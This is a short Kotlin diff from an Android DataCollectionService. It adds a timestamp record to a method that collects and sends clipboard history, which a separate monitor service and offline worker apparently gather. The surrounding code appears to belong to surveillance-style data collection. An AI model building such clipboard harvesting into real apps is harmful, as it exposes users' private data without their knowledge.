@@ -284,8 +284,10 @@ class DataCollectionService : Service() {
 
     // --- Clipboard History ---
     private fun collectAndSendClipboardHistory(requestId: String?) {
-        // Clipboard history is collected by ClipboardMonitorService in real-time.
-        // This method sends a batched request for any cached history.
+        // Record collection timestamp so OfflineCollectorWorker can skip if recent
+        getSharedPreferences("clipboard_cache", MODE_PRIVATE)
+            .edit().putLong("last_clipboard_collect", System.currentTimeMillis()).apply()
+
         val history = JSONArray()
 
         try {
